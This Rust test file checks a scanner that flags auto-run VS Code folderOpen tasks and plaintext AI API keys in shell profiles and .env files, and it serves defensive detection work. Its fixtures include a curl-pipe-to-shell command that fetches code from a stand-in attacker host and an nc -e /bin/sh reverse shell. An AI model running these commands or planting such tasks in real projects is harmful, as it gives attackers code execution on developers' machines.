use std::fs;
use std::time::{SystemTime, UNIX_EPOCH};

use macflow_scan::{
    inspect_env_content, inspect_tasks_content, render_report, scan_plaintext_keys_with_home,
    scan_vscode_tasks_with_home, Category, InspectionStatus, ScanContext, ScanResult, Severity,
};

// Upstream VS Code Tasks schema reference:
// https://code.visualstudio.com/docs/debugtest/tasks#_custom-tasks
// Attack vector reference: Contagious Interview / Keyv runOn: "folderOpen" automatic execution.
#[test]
fn test_task_folder_open_jsonc_and_severity_classification() {
    let jsonc = "{\n  // VS Code tasks.json with comments and trailing commas\n  \"version\": \"2.0.0\",\n  \"tasks\": [\n    {\n      \"label\": \"bootstrap-payload\",\n      \"type\": \"shell\",\n      \"command\": \"curl -s https://evil.example/init.sh | sh -c\",\n      \"runOptions\": { \"runOn\": \"folderOpen\", },\n    },\n    {\n      \"label\": \"version\",\n      \"type\": \"shell\",\n      \"command\": \"npm run build\",\n      \"runOptions\": { \"runOn\": \"folderOpen\" },\n    },\n    {\n      \"label\": \"split-args-payload\",\n      \"type\": \"shell\",\n      \"command\": \"python3\",\n      \"args\": [\"-u\", {\"value\": \"-c\", \"quoting\": \"weak\"}, \"import os\"],\n      \"runOptions\": { \"runOn\": \"folderOpen\" }\n    },\n    {\n      \"label\": \"manual-test\",\n      \"type\": \"shell\",\n      \"command\": \"cargo test\",\n      \"runOptions\": { \"runOn\": \"default\" }\n    }\n  ],\n}";
    let (findings, insp) =
        inspect_tasks_content(jsonc, ".vscode/tasks.json", "proj:repo/.vscode/tasks.json");
    assert_eq!(
        insp.status,
        InspectionStatus::Inspected {
            inspected_scope: "proj:repo/.vscode/tasks.json".into()
        }
    );
    assert_eq!(findings.len(), 3);
    assert_eq!(
        (
            &findings[0].id[..],
            findings[0].severity,
            findings[0].sub_category.as_deref(),
            findings[0].line_number
        ),
        (
            "vscode-task-folder-open",
            Severity::Critical,
            Some("VS Code tasks"),
            Some(6)
        )
    );
    assert!(findings[0].description.contains("Contagious Interview"));
    assert!(findings[0]
        .remediation
        .as_deref()
        .unwrap()
        .contains("task.allowAutomaticTasks"));
    assert_eq!(
        (findings[1].severity, findings[1].line_number),
        (Severity::High, Some(12))
    );
    assert_eq!(
        (findings[2].severity, findings[2].line_number),
        (Severity::Critical, Some(18))
    );
}

#[test]
fn test_task_scan_user_and_project_roots_and_unparseable() {
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let dir = std::env::temp_dir().join(format!("macflow_tasks_test_{ts}"));
    let home = dir.join("home");
    let user_cursor = home.join("Library/Application Support/Cursor/User");
    let proj_vscode = home.join("code/demo-repo/.vscode");
    fs::create_dir_all(&user_cursor).unwrap();
    fs::create_dir_all(&proj_vscode).unwrap();

    fs::write(
        user_cursor.join("tasks.json"),
        r#"{"version":"2.0.0","tasks":[{"label":"user-open","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}"#,
    )
    .unwrap();
    fs::write(
        proj_vscode.join("tasks.json"),
        r#"{"version":"2.0.0","tasks":[{"label":"net-backdoor","command":"nc","args":["-e","/bin/sh","10.0.0.1","4444"],"runOptions":{"runOn":"folderOpen"}}]}"#,
    )
    .unwrap();

    let ctx = ScanContext::new().with_roots(vec![home.join("code")]);
    let (findings, inspections) = scan_vscode_tasks_with_home(&ctx, Some(&home));
    assert_eq!(findings.len(), 2);
    assert!(findings
        .iter()
        .any(|f| f.scope.as_deref() == Some("user") && f.severity == Severity::High));
    assert!(findings.iter().any(|f| f.scope.as_deref()
        == Some("proj:code/demo-repo/.vscode/tasks.json")
        && f.severity == Severity::Critical));

    let report = render_report(&ScanResult::new(
        findings,
        inspections,
        "2026-10-21T00:00:00Z",
    ));
    assert!(!report.contains("scope unknown") && !report.contains("Other findings"));

    let (bad_f, bad_i) = inspect_tasks_content("{ broken ", "tasks.json", "user");
    assert!(bad_f.is_empty() && matches!(bad_i.status, InspectionStatus::UnparseableData { .. }));

    let skip_ctx = ScanContext::new().with_categories(vec![Category::Garbage]);
    let (_, skip_i) = scan_vscode_tasks_with_home(&skip_ctx, Some(&home));
    assert!(matches!(skip_i[0].status, InspectionStatus::Skipped { .. }));
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_task_and_env_plaintext_keys_detection() {
    let ant = format!("sk-ant-api03-{}", "a".repeat(32));
    let oai = ["sk-proj-", &"b".repeat(36)].concat();
    let gem = format!("AIzaSy{}", "c".repeat(33));
    let or = format!("sk-or-v1-{}", "d".repeat(32));
    let groq = format!("gsk_{}", "e".repeat(32));
    let hf = format!("hf_{}", "f".repeat(30));

    let shell_content = format!(
        "# Shell profile\nexport ANTHROPIC_API_KEY=\"{ant}\" # see \"example\" or \"$(op read ...)\"\nOPENAI_API_KEY={oai}\nexport\tGEMINI_API_KEY='{gem}'\nset --export x_key {or}\nexport GROQ_API_KEY={groq}#comment\nexport HF_TOKEN={hf}\nexport ANTHROPIC_API_KEY=\"$SECRET_REF\"\nexport OPENAI_API_KEY=\"$(op read op://dev/openai/key)\"\nexport GEMINI_API_KEY=\"your-api-key-here\"\nexport GROQ_API_KEY=\"\" # set to \"prod-secret-value-here\"\n"
    );

    let (findings, insp) = inspect_env_content(&shell_content, "~/.zshrc", "user");
    assert_eq!(
        insp.status,
        InspectionStatus::Inspected {
            inspected_scope: "user".into()
        }
    );
    assert_eq!((findings.len(), findings[0].line_number), (6, Some(2)));
    assert!(findings[0].title.contains("sk-ant-..."));

    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let dir = std::env::temp_dir().join(format!("macflow_keys_test_{ts}"));
    let (home, repo) = (dir.join("home"), dir.join("home/projects/app"));
    fs::create_dir_all(&repo).unwrap();
    fs::write(
        home.join(".zshrc"),
        format!("export OPENAI_API_KEY={oai}\n"),
    )
    .unwrap();
    fs::write(
        repo.join(".env.local"),
        format!("ANTHROPIC_API_KEY={ant}\n"),
    )
    .unwrap();
    fs::write(
        repo.join(".env.example"),
        format!("ANTHROPIC_API_KEY={ant}\n"),
    )
    .unwrap();

    let (k_findings, k_insp) = scan_plaintext_keys_with_home(&ScanContext::new(), Some(&home));
    assert_eq!(k_findings.len(), 2);
    let rep = render_report(&ScanResult::new(k_findings, k_insp, "2026-10-21T00:00:00Z"));
    assert!(!rep.contains("scope unknown") && !rep.contains("Other findings"));
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_nested_repos_tasks_and_env_discovered() {
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let dir = std::env::temp_dir().join(format!("macflow_nested_test_{ts}"));
    let home = dir.join("home");
    let root = dir.join("root");
    let env_repo = root.join("team/project");
    let tasks_repo = root.join("dept/service");

    fs::create_dir_all(&home).unwrap();
    fs::create_dir_all(&env_repo).unwrap();
    fs::create_dir_all(tasks_repo.join(".vscode")).unwrap();

    let ant = format!("sk-ant-api03-{}", "a".repeat(32));
    fs::write(env_repo.join(".env"), format!("ANTHROPIC_API_KEY={ant}\n")).unwrap();

    fs::write(
        tasks_repo.join(".vscode/tasks.json"),
        r#"{"version":"2.0.0","tasks":[{"label":"nested-task","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}"#,
    )
    .unwrap();

    // Verify ignored directories (.git, node_modules, target) and depth > 4 are not visited
    let ignored_node_modules = root.join("team/project/node_modules/bad_pkg");
    fs::create_dir_all(&ignored_node_modules).unwrap();
    fs::write(
        ignored_node_modules.join(".env"),
        format!("ANTHROPIC_API_KEY={ant}\n"),
    )
    .unwrap();

    let ignored_git = root.join("dept/service/.git/hooks");
    fs::create_dir_all(&ignored_git).unwrap();
    fs::write(
        ignored_git.join(".env"),
        format!("ANTHROPIC_API_KEY={ant}\n"),
    )
    .unwrap();

    let ignored_target = root.join("dept/service/target/.vscode");
    fs::create_dir_all(&ignored_target).unwrap();
    fs::write(
        ignored_target.join("tasks.json"),
        r#"{"version":"2.0.0","tasks":[{"label":"target-task","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}"#,
    )
    .unwrap();

    let deep_dir = root.join("l1/l2/l3/l4/l5");
    fs::create_dir_all(&deep_dir).unwrap();
    fs::write(deep_dir.join(".env"), format!("ANTHROPIC_API_KEY={ant}\n")).unwrap();

    #[cfg(unix)]
    let _ = std::os::unix::fs::symlink(&root, root.join("team/symloop"));

    let ctx = ScanContext::new().with_roots(vec![root.clone()]);

    let (key_findings, _) = scan_plaintext_keys_with_home(&ctx, Some(&home));
    assert_eq!(
        key_findings.len(),
        1,
        "Expected exactly 1 key finding in team/project/.env, got: {key_findings:?}"
    );
    assert_eq!(key_findings[0].id, "plaintext-ai-key:ANTHROPIC_API_KEY");
    assert!(
        key_findings[0]
            .file_path
            .as_deref()
            .unwrap()
            .contains("team/project/.env"),
        "Expected file_path containing team/project/.env, got: {:?}",
        key_findings[0].file_path
    );

    let (task_findings, _) = scan_vscode_tasks_with_home(&ctx, Some(&home));
    assert_eq!(
        task_findings.len(),
        1,
        "Expected exactly 1 task finding in dept/service/.vscode/tasks.json, got: {task_findings:?}"
    );
    assert_eq!(task_findings[0].id, "vscode-task-folder-open");
    assert!(
        task_findings[0]
            .file_path
            .as_deref()
            .unwrap()
            .contains("dept/service/.vscode/tasks.json"),
        "Expected file_path containing dept/service/.vscode/tasks.json, got: {:?}",
        task_findings[0].file_path
    );

    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_public_client_google_keys_are_low_with_restrict_advice() {
    // Firebase and Maps web keys ship to browsers by design; they still work for
    // Gemini and billed APIs unless restricted, so report Low, not High.
    let gkey = format!("AIzaSy{}", "c".repeat(33));
    let content = format!(
        "NEXT_PUBLIC_FIREBASE_API_KEY={gkey}\nVITE_GOOGLE_MAPS_KEY={gkey}\nFIREBASE_API_KEY={gkey}\nEXPO_PUBLIC_GOOGLE_API_KEY={gkey}\n"
    );
    let (findings, _) = inspect_env_content(&content, "app/.env.local", "proj");
    assert_eq!(findings.len(), 4, "{findings:?}");
    for f in &findings {
        assert_eq!(f.severity, Severity::Low, "{}", f.title);
        assert!(f.title.contains("AIza..."), "{}", f.title);
        let rem = f.remediation.as_deref().unwrap_or("");
        assert!(rem.contains("Restrict"), "{rem}");
        assert!(!f.description.contains(&gkey), "key value printed");
    }
}

#[test]
fn test_google_key_in_server_variable_stays_high() {
    let gkey = format!("AIzaSy{}", "c".repeat(33));
    let (findings, _) =
        inspect_env_content(&format!("GEMINI_API_KEY={gkey}\n"), "~/.zshrc", "user");
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].severity, Severity::High);
}

#[test]
fn test_secret_key_in_public_variable_stays_high_and_says_it_ships_to_browsers() {
    // NEXT_PUBLIC_ values are bundled into client JavaScript: a real secret there is worse.
    let oai = ["sk-proj-", &"b".repeat(36)].concat();
    let (findings, _) = inspect_env_content(
        &format!("NEXT_PUBLIC_OPENAI_API_KEY={oai}\n"),
        "app/.env",
        "proj",
    );
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].severity, Severity::High);
    assert!(
        findings[0].description.contains("browser"),
        "{}",
        findings[0].description
    );
}

#[test]
fn test_public_gemini_key_stays_high_and_singular_map_is_a_web_key() {
    // A Gemini key in client code is a leaked AI key, not a Firebase/Maps web key.
    let gkey = format!("AIzaSy{}", "c".repeat(33));
    for var in [
        "NEXT_PUBLIC_GEMINI_API_KEY",
        "VITE_GOOGLE_GENERATIVE_AI_API_KEY",
    ] {
        let (f, _) = inspect_env_content(&format!("{var}={gkey}\n"), "app/.env", "proj");
        assert_eq!(f.len(), 1, "{var}");
        assert_eq!(f[0].severity, Severity::High, "{var}");
        assert!(f[0].description.contains("browser"), "{}", f[0].description);
    }
    let (f, _) = inspect_env_content(&format!("GOOGLE_MAP_API_KEY={gkey}\n"), "app/.env", "proj");
    assert_eq!(f[0].severity, Severity::Low);
}
